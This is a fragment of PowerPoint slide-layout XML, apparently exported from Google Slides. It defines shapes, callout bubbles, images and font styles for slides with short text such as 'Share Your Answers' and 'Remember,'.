    <p:bg>
      <p:bgPr>
        <a:solidFill>
          <a:schemeClr val="lt2"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="305" name="Shape 305"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="306" name="Google Shape;306;p44"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="459100" y="1380744"/>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7" name="Google Shape;307;p44"/>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pic>
        <p:nvPicPr>
          <p:cNvPr id="308" name="Google Shape;308;p44"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="967670" y="1896525"/>
            <a:ext cx="1724260" cy="1620450"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="309" name="Google Shape;309;p44"/>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are Your Answers">
  <p:cSld name="CUSTOM_10_1_1_1_1_1_2">
    <p:bg>
      <p:bgPr>
        <a:solidFill>
          <a:srgbClr val="F2F2F2"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="310" name="Shape 310"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="311" name="Google Shape;311;p45"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="1251238" y="1174875"/>
            <a:ext cx="2443200" cy="2443500"/>
          </a:xfrm>
          <a:prstGeom prst="wedgeEllipseCallout">
            <a:avLst>
              <a:gd fmla="val -20833" name="adj1"/>
              <a:gd fmla="val 62500" name="adj2"/>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45"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5449563" y="1174875"/>
            <a:ext cx="2443200" cy="2443500"/>
          </a:xfrm>
          <a:prstGeom prst="wedgeEllipseCallout">
            <a:avLst>
              <a:gd fmla="val -20833" name="adj1"/>
              <a:gd fmla="val 62500" name="adj2"/>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45"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3586938" y="1399275"/>
            <a:ext cx="1994400" cy="1994700"/>
          </a:xfrm>
          <a:prstGeom prst="wedgeEllipseCallout">
            <a:avLst>
              <a:gd fmla="val -20833" name="adj1"/>
              <a:gd fmla="val 62500" name="adj2"/>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45"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="14183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Share</a:t>
            </a:r>
            <a:endParaRPr b="1" i="0" sz="4000" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="FFFFFF"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="315" name="Google Shape;315;p45"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="35296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Your</a:t>
            </a:r>
            <a:endParaRPr b="1" i="0" sz="4000" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:srgbClr val="FFFFFF"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="316" name="Google Shape;316;p45"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5469363" y="2020425"/>
            <a:ext cx="2403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Answers</a:t>
            </a:r>
            <a:endParaRPr b="1" i="0" sz="4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member">
  <p:cSld name="CUSTOM_10_1_1_1_1_1_1">
    <p:bg>
      <p:bgPr>
        <a:solidFill>
          <a:srgbClr val="F2F2F2"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="317" name="Shape 317"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="318" name="Google Shape;318;p46"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4869500" y="1501000"/>
            <a:ext cx="3901200" cy="740100"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="0" lIns="457200" spcFirstLastPara="1" rIns="457200" wrap="square" tIns="91425">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" marR="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="000000"/>
              </a:buClr>
              <a:buSzPts val="5200"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en" sz="4500" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Remember, </a:t>
            </a:r>
            <a:endParaRPr b="1" i="0" sz="4500" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="319" name="Google Shape;319;p46"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId2">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="-556324" y="1502075"/>
            <a:ext cx="5962899" cy="2537225"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="320" name="Google Shape;320;p46"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="3972318" y="1206125"/>
            <a:ext cx="1051285" cy="920372"/>
            <a:chOff x="587700" y="-13400"/>
            <a:chExt cx="5735325" cy="5021125"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="321" name="Google Shape;321;p46"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3126550" y="3129550"/>
              <a:ext cx="449525" cy="1850775"/>
            </a:xfrm>
            <a:custGeom>
              <a:rect b="b" l="l" r="r" t="t"/>
              <a:pathLst>
                <a:path extrusionOk="0" fill="none" h="74031" w="17981">
                  <a:moveTo>
                    <a:pt x="1" y="68541"/>
                  </a:moveTo>
                  <a:cubicBezTo>
                    <a:pt x="7486" y="74031"/>
                    <a:pt x="17981" y="42278"/>
                    <a:pt x="5491" y="0"/>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46"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3253475" y="3038050"/>
              <a:ext cx="1008375" cy="1969675"/>
            </a:xfrm>
            <a:custGeom>
              <a:rect b="b" l="l" r="r" t="t"/>
              <a:pathLst>
                <a:path extrusionOk="0" fill="none" h="78787" w="40335">
                  <a:moveTo>
                    <a:pt x="0" y="69792"/>
                  </a:moveTo>
                  <a:cubicBezTo>
                    <a:pt x="16481" y="78787"/>
                    <a:pt x="40334" y="34844"/>
                    <a:pt x="28206" y="11125"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="22519" y="0"/>
                    <a:pt x="1541" y="5118"/>
                    <a:pt x="1913" y="9099"/>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46"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="587700" y="131875"/>
              <a:ext cx="2878775" cy="2997700"/>
            </a:xfrm>
            <a:custGeom>
              <a:rect b="b" l="l" r="r" t="t"/>
              <a:pathLst>
                <a:path extrusionOk="0" fill="none" h="119908" w="115151">
                  <a:moveTo>
                    <a:pt x="115151" y="119907"/>
                  </a:moveTo>
                  <a:cubicBezTo>
                    <a:pt x="50602" y="114789"/>
                    <a:pt x="1" y="75106"/>
                    <a:pt x="30926" y="48761"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="88165" y="0"/>
                    <a:pt x="115151" y="119907"/>
                    <a:pt x="115151" y="119907"/>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46"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3408550" y="-13400"/>
              <a:ext cx="1796500" cy="3142975"/>
            </a:xfrm>
            <a:custGeom>
              <a:rect b="b" l="l" r="r" t="t"/>
              <a:pathLst>
                <a:path extrusionOk="0" fill="none" h="125719" w="71860">
                  <a:moveTo>
                    <a:pt x="2317" y="125718"/>
                  </a:moveTo>
                  <a:cubicBezTo>
                    <a:pt x="1" y="63568"/>
                    <a:pt x="64974" y="1"/>
                    <a:pt x="69492" y="63568"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="71860" y="96850"/>
                    <a:pt x="2317" y="125718"/>
                    <a:pt x="2317" y="125718"/>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46"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3466450" y="2580250"/>
              <a:ext cx="2856575" cy="1271275"/>
            </a:xfrm>
            <a:custGeom>
              <a:rect b="b" l="l" r="r" t="t"/>
              <a:pathLst>
                <a:path extrusionOk="0" fill="none" h="50851" w="114263">
                  <a:moveTo>
                    <a:pt x="1" y="21972"/>
                  </a:moveTo>
                  <a:cubicBezTo>
                    <a:pt x="52732" y="1"/>
                    <a:pt x="75965" y="50850"/>
                    <a:pt x="114262" y="13184"/>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6" name="Google Shape;326;p46"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5345350" y="2338950"/>
            <a:ext cx="3524400" cy="2471400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="0" lIns="0" spcFirstLastPara="1" rIns="45720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E5E73"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="327" name="Google Shape;327;p46"/>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28" name="Shape 328"/>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 slide - 1-3">
  <p:cSld name="CUSTOM_21_1_1_1">
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="329" name="Shape 329"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="330" name="Google Shape;330;p48"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="-9375" y="929900"/>
            <a:ext cx="7346700" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="19050">
            <a:solidFill>
              <a:srgbClr val="2E5E73"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="med" w="med" type="none"/>
            <a:tailEnd len="med" w="med" type="oval"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="331" name="Google Shape;331;p48"/>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48"/>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48"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="953325" y="11368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48"/>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335" name="Google Shape;335;p48"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="802850" y="1749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336" name="Google Shape;336;p48"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="802850" y="23916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337" name="Google Shape;337;p48"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1224625" y="1129175"/>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38" name="Google Shape;338;p48"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="2" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1224625" y="1793688"/>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39" name="Google Shape;339;p48"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="3" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1224625" y="2435788"/>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40" name="Google Shape;340;p48"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="50" y="127400"/>
            <a:ext cx="9144000" cy="393600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="8229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1" name="Google Shape;341;p48"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="136025" y="2336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2" name="Google Shape;342;p48"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="173938" y="271538"/>
            <a:ext cx="496875" cy="496875"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="343" name="Google Shape;343;p48"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="4" type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="-6000" y="478650"/>
            <a:ext cx="9168600" cy="323100"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="8229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Font typeface="Roboto Light"/>
              <a:buNone/>
              <a:defRPr>
                <a:latin typeface="Roboto Light"/>
                <a:ea typeface="Roboto Light"/>
                <a:cs typeface="Roboto Light"/>
                <a:sym typeface="Roboto Light"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr lvl="2">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="2800"/>
              <a:buFont typeface="Roboto Light"/>
              <a:buNone/>
              <a:defRPr>
                <a:latin typeface="Roboto Light"/>
                <a:ea typeface="Roboto Light"/>
                <a:cs typeface="Roboto Light"/>
                <a:sym typeface="Roboto Light"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr lvl="3">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="2800"/>
              <a:buFont typeface="Roboto Light"/>
              <a:buNone/>
              <a:defRPr>
                <a:latin typeface="Roboto Light"/>
                <a:ea typeface="Roboto Light"/>
                <a:cs typeface="Roboto Light"/>
                <a:sym typeface="Roboto Light"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr lvl="4">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="2800"/>
              <a:buFont typeface="Roboto Light"/>
              <a:buNone/>
              <a:defRPr>
                <a:latin typeface="Roboto Light"/>
                <a:ea typeface="Roboto Light"/>
                <a:cs typeface="Roboto Light"/>
                <a:sym typeface="Roboto Light"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr lvl="5">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="2800"/>
              <a:buFont typeface="Roboto Light"/>
              <a:buNone/>
              <a:defRPr>
                <a:latin typeface="Roboto Light"/>
                <a:ea typeface="Roboto Light"/>
                <a:cs typeface="Roboto Light"/>
                <a:sym typeface="Roboto Light"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr lvl="6">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="2800"/>
              <a:buFont typeface="Roboto Light"/>
              <a:buNone/>
              <a:defRPr>
                <a:latin typeface="Roboto Light"/>
                <a:ea typeface="Roboto Light"/>
                <a:cs typeface="Roboto Light"/>
                <a:sym typeface="Roboto Light"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr lvl="7">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="2800"/>
              <a:buFont typeface="Roboto Light"/>
              <a:buNone/>
              <a:defRPr>
                <a:latin typeface="Roboto Light"/>
                <a:ea typeface="Roboto Light"/>
                <a:cs typeface="Roboto Light"/>
                <a:sym typeface="Roboto Light"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr lvl="8">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="2800"/>
              <a:buFont typeface="Roboto Light"/>
              <a:buNone/>
              <a:defRPr>
                <a:latin typeface="Roboto Light"/>
                <a:ea typeface="Roboto Light"/>
                <a:cs typeface="Roboto Light"/>
                <a:sym typeface="Roboto Light"/>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01">
  <p:cSld name="CUSTOM_26_3">
    <p:bg>
      <p:bgPr>
        <a:solidFill>
          <a:srgbClr val="F2F2F2"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="344" name="Shape 344"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="345" name="Google Shape;345;p49"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="2694300"/>
            <a:ext cx="9144000" cy="740700"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="0" spcFirstLastPara="1" rIns="0" wrap="square" tIns="91425">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr lvl="0" algn="ctr">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="4000"/>
              <a:buFont typeface="Roboto Light"/>
              <a:buNone/>
              <a:defRPr b="0" sz="4000">
                <a:latin typeface="Roboto Light"/>
                <a:ea typeface="Roboto Light"/>
                <a:cs typeface="Roboto Light"/>
                <a:sym typeface="Roboto Light"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr lvl="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="2800"/>
              <a:buFont typeface="Roboto Light"/>
              <a:buNone/>
              <a:defRPr>
                <a:latin typeface="Roboto Light"/>
                <a:ea typeface="Roboto Light"/>
                <a:cs typeface="Roboto Light"/>
                <a:sym typeface="Roboto Light"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr lvl="2">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="2800"/>
              <a:buFont typeface="Roboto Light"/>
              <a:buNone/>
              <a:defRPr>
                <a:latin typeface="Roboto Light"/>
                <a:ea typeface="Roboto Light"/>
                <a:cs typeface="Roboto Light"/>
                <a:sym typeface="Roboto Light"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr lvl="3">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="2800"/>
              <a:buFont typeface="Roboto Light"/>
              <a:buNone/>
              <a:defRPr>
                <a:latin typeface="Roboto Light"/>
                <a:ea typeface="Roboto Light"/>
                <a:cs typeface="Roboto Light"/>
                <a:sym typeface="Roboto Light"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr lvl="4">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="2800"/>
              <a:buFont typeface="Roboto Light"/>
              <a:buNone/>
              <a:defRPr>
                <a:latin typeface="Roboto Light"/>
                <a:ea typeface="Roboto Light"/>
                <a:cs typeface="Roboto Light"/>
                <a:sym typeface="Roboto Light"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr lvl="5">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="2800"/>
              <a:buFont typeface="Roboto Light"/>
              <a:buNone/>
              <a:defRPr>
                <a:latin typeface="Roboto Light"/>
                <a:ea typeface="Roboto Light"/>
                <a:cs typeface="Roboto Light"/>
                <a:sym typeface="Roboto Light"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr lvl="6">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="2800"/>
              <a:buFont typeface="Roboto Light"/>
              <a:buNone/>
              <a:defRPr>
                <a:latin typeface="Roboto Light"/>
                <a:ea typeface="Roboto Light"/>
                <a:cs typeface="Roboto Light"/>
                <a:sym typeface="Roboto Light"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr lvl="7">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="2800"/>
              <a:buFont typeface="Roboto Light"/>
              <a:buNone/>
              <a:defRPr>
                <a:latin typeface="Roboto Light"/>
                <a:ea typeface="Roboto Light"/>
                <a:cs typeface="Roboto Light"/>
                <a:sym typeface="Roboto Light"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr lvl="8">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="2800"/>
              <a:buFont typeface="Roboto Light"/>
              <a:buNone/>
              <a:defRPr>
                <a:latin typeface="Roboto Light"/>
                <a:ea typeface="Roboto Light"/>
                <a:cs typeface="Roboto Light"/>
                <a:sym typeface="Roboto Light"/>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2">
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="346" name="Shape 346"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="347" name="Google Shape;347;p5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348" name="Google Shape;348;p5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349" name="Google Shape;349;p5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0" name="Google Shape;350;p50"/>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p:cSld name="CUSTOM_22">
    <p:bg>
      <p:bgPr>
        <a:solidFill>
          <a:srgbClr val="F2F2F2"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="351" name="Shape 351"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="352" name="Google Shape;352;p51"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId2">
            <a:alphaModFix amt="11000"/>
          </a:blip>
          <a:srcRect b="7136" l="-6410" r="6410" t="-3050"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="5157740" y="2672100"/>
            <a:ext cx="3986260" cy="2471400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="353" name="Google Shape;353;p51"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1959725" y="1641200"/>
            <a:ext cx="8520600" cy="572700"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
